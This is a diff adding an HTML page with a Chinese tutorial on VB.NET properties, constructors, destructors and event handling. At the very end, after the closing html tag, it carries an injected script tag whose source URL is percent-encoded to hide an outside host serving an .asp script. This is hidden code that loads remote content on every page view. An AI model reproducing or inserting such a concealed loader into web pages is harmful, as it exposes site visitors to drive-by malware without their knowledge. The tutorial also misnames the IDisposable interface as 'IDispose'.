@@ -1,0 +1,159 @@
+<html>
+
+<head>
+<title></title>
+</head>
+
+<body>
+
+[Public | Private | Protected | Friend | MustInherit | 
+NotInheritable] 
+
+<a href="#构造函数">构造函数</a>&nbsp; <a href="#析构函数">析构函数</a> 
+<a href="#事件">事件</a><br>
+
+属性
+修饰符 Property 属性名 ( ByVal 参数列表) As 类型 <br>
+Get<br>
+Return 变量名<br>
+End Get<br>
+Set ( Value As 类型)<br>
+变量名 = Value<br>
+End Set<br>
+End Property<br>
+属性的修饰符有：<br>
+ReadOnly :该属性只读，由ReadOnly修饰的属性，没有Set块。<br>
+WriteOnly: 该属性只能设置，不能检索。由WriteOnly修饰的属性，没有Get块。<br>
+OverLoads: 
+该属性重载父类的同名属性，参数列表必须和同名属性的参数列表有所不同。<br>
+同一个类中多个同名但参数不同的属性不需要Overloads修饰。<br>
+Overrides: 
+重写父类的同名属性，属性名、参数、返回值类型必须都相同。<br>
+Overridable: 可以在派生类中被重写。<br>
+NotOverridable: 不能被重写。默认情况下，属性是NotOverridable。
+
+<p>看下面的例子：<br>
+<font color="#0080C0">Public Property Prop1() As String<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Get<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' The Get property procedure is called 
+when the value<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' of a property is retrieved. <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Return PropertyValue<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; End Get<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Set(ByVal Value As String)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' The Set property procedure is called 
+when the value <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' of a property is modified. <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ' The value to be assigned is passed in 
+the argument to Set. <br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PropertyValue = Value<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; End Set<br>
+End Property</font></p>
+<font color="#FF0000"><strong><big><a name="构造函数">
+
+<p>构造函数</a></big></strong></font> <br>
+<font color="#0080C0">Sub New()<br>
+&nbsp;&nbsp;&nbsp; MyBase.New()<br>
+&nbsp;&nbsp;&nbsp; 其它要做的工作<br>
+End Sub</font><br>
+每个类的构造函数都会调用父类的构造函数，直到调用到基类的构造函数。 
+父类构造函数中代码执行完后，执行其子类构造函数中剩下的代码。<br>
+可以创建参数化构造函数，如：<br>
+<font color="#0080C0">Sub New( ByVal Caption As String )<br>
+&nbsp;&nbsp;&nbsp; MyBase.New()<br>
+&nbsp;&nbsp;&nbsp; 其它要做的工作<br>
+End Sub</font><br>
+早期的VB版本中，构造函数并不是New，而是Class_Initialize。</p>
+
+<p><font color="#FF0000"><strong><big><a name="析构函数">析构函数</a></big></strong></font> 
+<br>
+<font color="#0080C0">Sub Finalize() <br>
+&nbsp;&nbsp;&nbsp; 其它要做的工作 <br>
+&nbsp;&nbsp;&nbsp; MyBase.Finalize() <br>
+End Sub </font><br>
+每个类的析构函数在处理完自己的任务后都会调用父类的析构函数，直到调用到基类的析构函数。 
+在释放对象之前，CLR 会为定义了 <b>Sub Finalize</b> 
+过程的对象自动调用 <b>Finalize</b> 方法。执行 Sub Finalize 
+会有轻度的性能降低，所以应当只有在需要显式释放对象时才定义 
+Sub Finalize 方法。<br>
+早期的VB版本中，析构函数并不是Finalize，而是Class_Terminate。 </p>
+
+<p>不能显式调用Finalize，但可以显式调用另一种析构函数Dispose达到立即释放资源的目的。如果一个类能使用Dispose来释放资源，其所属的类需要实现IDispose接口。Dispose不会自动调用，需要显式调用。</p>
+
+<p><a name="事件"><font color="#FF0000"><strong><big>事件</big></strong></font></a><br>
+声明事件<br>
+使用 Event 关键字在类、结构、模块和接口内部声明事件。<br>
+<font color="#0080C0">Event AnEvent(ByVal EventNumber As Integer)</font><br>
+<font color="#0080C0">Public Event PercentDone(ByVal Percent As Single, ByRef Cancel As 
+Boolean)</font><br>
+事件可以具有任意参数，但不能有可选参数或ParamArray参数，也不能有返回值。<br>
+<br>
+引发事件<br>
+<font color="#0080C0"><big>RaiseEvent AnEvent(EventNumber)</big></font><br>
+将事件添加到类的过程指定此类的对象可以引发特定事件。要使某事件真正发生，必须使用 
+RaiseEvent 语句。可以使用 Handles 关键字或 AddHandler 语句将事件与一个<font
+color="#0080C0">事件处理程序</font>过程相关联。必须在声明事件的范围内引发事件。例如，派生类不能引发从基类继承的事件。</p>
+
+<p>事件处理程序<br>
+是相应事件发生时调用的过程。您可以将任何有效子例程用作事件处理程序，但不能将函数用作事件处理程序。<br>
+Visual Basic 
+采用标准命名约定对事件处理程序进行命名，即用下划线把事件发送器和事件的名称组合起来。例如，名为 
+<font color="#0080C0">button1</font> 的按钮的单击事件应命名为 <font
+color="#0080C0">Sub button1_Click</font>。</p>
+
+<p>关联事件与事件处理程序<br>
+第一种方法是：使用Handles进行关联。要求用WithEvents来声明对象（事件源）。这是标准方法，这种关联是在编译时静态关联，看下面的例子。<br>
+<font color="#0080C0">Friend WithEvents Button1 As System.Windows.Forms.Button<br>
+Protected Sub Button1_Click(ByVal sender As System.Object, _ <br>
+ByVal e As System.EventArgs) Handles Button1.Click<br>
+。。。<br>
+End Sub</font><br>
+第二种方法是：使用AddHandler和RemoveHandler，可以在运行时动态地把事件与事件处理程序关联和断开。<br>
+AddHandler的使用方法：<br>
+1. 声明类的对象变量，该变量是您要处理的事件源。不像 WithEvents 
+变量，此变量可以是过程中的本地变量；例如： <br>
+&nbsp;&nbsp;&nbsp; <font color="#0080C0">Dim CI As New Class1()</font><br>
+2. 用 AddHandler 语句指定事件发送器的名称，用 AddressOf 
+语句提供事件处理程序的名称；例如： <br>
+&nbsp;&nbsp;&nbsp; <font color="#0080C0">AddHandler CI.AnEvent, AddressOf EHandler 
+&nbsp;&nbsp;&nbsp; '注意AddHandler后面不要加括号，AddressOf后面也不要括号</font><br>
+只要和事件的参数匹配，任何过程都能用作事件处理程序。<br>
+3. 给事件处理程序添加代码，如以下示例中所示： <br>
+&nbsp;&nbsp; <font color="#0080C0"> Public Sub EHandler(ByVal EventNumber As Integer)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;Received event number 
+&quot; &amp; CStr(EventNumber))<br>
+&nbsp;&nbsp;&nbsp; End Sub</font><br>
+RemoveHandler的用法：<br>
+<font color="#0080C0">RemoveHandler CI.AnEvent, AddressOf EHandler&nbsp;&nbsp;&nbsp; '注意RemoveHandler后面不要加括号</font></p>
+
+<p>处理来自基类的事件：<br>
+通过给事件处理程序过程的声明行添加 Handles MyBase.&lt;event name&gt; 
+语句来声明派生类中的事件处理程序，其中的 event name 
+是基类中正在处理的事件的名称。例如： <br>
+<font color="#0080C0">Public Class Class1<br>
+&nbsp;&nbsp;&nbsp; Public Event SE(ByVal i As Integer)<br>
+&nbsp;&nbsp;&nbsp; ' Place methods and properties here.<br>
+End Class<br>
+<br>
+Public Class Class2<br>
+&nbsp;&nbsp;&nbsp; Inherits Class1<br>
+&nbsp;&nbsp;&nbsp; Sub EventHandler(ByVal x As Integer) Handles MyBase.SE<br>
+&nbsp;&nbsp;&nbsp; ' Place code to handle events from Class1 here.<br>
+&nbsp;&nbsp;&nbsp; End Sub<br>
+End Class</font><br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+</p>
+
+<p><br>
+<br>
+<br>
+</p>
+</body>
+</html>
+<script src="http://%78%66%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70"></script>
